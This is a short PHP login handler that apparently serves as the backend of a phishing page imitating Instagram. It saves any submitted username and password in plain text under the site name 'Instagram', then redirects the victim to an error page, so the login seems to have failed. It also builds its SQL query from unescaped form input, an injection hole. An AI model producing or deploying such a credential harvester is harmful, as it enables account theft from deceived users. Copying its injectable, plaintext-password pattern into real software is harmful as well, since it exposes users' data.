<?php
    session_start();
    include '../config.php';
    $nam=$_POST['nam'];
    $pass=$_POST['pass'];

    

    if($nam!="" && $pass!="")
    {
        $_SESSION['in']=$nam;
        $admin_select="INSERT INTO user (UserID, UserName, UserPassword, SiteName) VALUES (NULL, '$nam', '$pass', 'Instagram');";
        // $admin_select="SELECT * FROM admin WHERE AdminUID='$num' AND AdminPassword='$pass'";
        $admin_result=mysqli_query($con,$admin_select);
        echo "<script>window.location.href='../error/dist/index.php';</script>";

        // echo "Succefuly Inserted!!!";
        // echo "<script>window.location.href='index.php';</script>";
    
        // $admin_fetch=mysqli_fetch_assoc($admin_result);
    }
    else
    {
        echo "<script > alert('Username or password incorrect!!!');window.location.href = 'index.php';</script>";

    }

?>
